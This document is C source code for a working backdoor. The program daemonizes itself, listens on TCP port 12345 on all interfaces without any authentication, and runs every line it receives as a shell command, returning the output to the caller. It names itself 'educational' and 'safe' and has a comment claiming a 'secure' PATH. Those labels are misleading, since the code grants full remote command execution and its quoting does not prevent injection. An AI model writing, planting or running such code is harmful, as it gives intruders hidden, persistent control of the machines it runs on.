#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

#define PORT 12345
#define BUFFER_SIZE 1024
#define LOG_FILE "/tmp/educational_backdoor.log"

static int server_fd = -1;
static FILE *log_fp = NULL;

// Helper to send all data reliably over socket
ssize_t send_all(int sockfd, const void *buf, size_t len) {
    size_t total = 0;
    const char *ptr = buf;
    while (total < len) {
        ssize_t sent = send(sockfd, ptr + total, len - total, 0);
        if (sent == -1) return -1;
        total += sent;
    }
    return total;
}

void daemonize() {
    pid_t pid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);  // Parent exits

    if (setsid() < 0) exit(EXIT_FAILURE);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);  // Second parent exits

    umask(0);
    chdir("/");

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect stdin, stdout, stderr to /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}

void log_message(const char *msg) {
    if (!log_fp) return;
    fprintf(log_fp, "%s\n", msg);
    fflush(log_fp);
}

void cleanup(int signo) {
    log_message("Daemon exiting...");
    if (server_fd != -1) close(server_fd);
    if (log_fp) fclose(log_fp);
    exit(EXIT_SUCCESS);
}

int main() {
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};
    const char *welcome_msg = "Educational Safe backdoor active\n";
    const char *prompt = "edu-backdoor> ";

    daemonize();

    log_fp = fopen(LOG_FILE, "a+");
    if (!log_fp) exit(EXIT_FAILURE);

    signal(SIGTERM, cleanup);
    signal(SIGINT, cleanup);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        log_message("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        log_message("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) < 0) {
        log_message("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    log_message("Daemon started, listening for connections...");

    while (1) {
        int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
        if (new_socket < 0) {
            if (errno == EINTR) continue;
            log_message("Accept failed");
            break;
        }

        send_all(new_socket, welcome_msg, strlen(welcome_msg));
        send_all(new_socket, prompt, strlen(prompt));

        // Interactive command shell
        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            int valread = read(new_socket, buffer, BUFFER_SIZE - 1);
            if (valread <= 0) {
                log_message("Client disconnected or read error");
                break;
            }
            buffer[valread] = '\0';

            // Remove trailing CR/LF
            buffer[strcspn(buffer, "\r\n")] = 0;

            if (strlen(buffer) == 0) {
                send_all(new_socket, prompt, strlen(prompt));
                continue;
            }

            char logbuf[BUFFER_SIZE + 50];
            snprintf(logbuf, sizeof(logbuf), "Received command: %s", buffer);
            log_message(logbuf);

            if (strcmp(buffer, "exit") == 0) {
                send_all(new_socket, "Bye!\n", 5);
                break;
            }

            // Secure environment PATH to avoid weird shells
            char cmd[BUFFER_SIZE + 100];
            snprintf(cmd, sizeof(cmd), "PATH=/usr/bin:/bin:/usr/sbin:/sbin sh -c '%s'", buffer);

            FILE *fp = popen(cmd, "r");
            if (fp == NULL) {
                send_all(new_socket, "Failed to execute command\n", 26);
                send_all(new_socket, prompt, strlen(prompt));
                continue;
            }

            // Send command output line by line
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                if (send_all(new_socket, buffer, strlen(buffer)) == -1) {
                    log_message("Failed to send command output");
                    break;
                }
            }
            pclose(fp);

            send_all(new_socket, prompt, strlen(prompt));
        }

        close(new_socket);
    }

    cleanup(0);
    return 0;
}
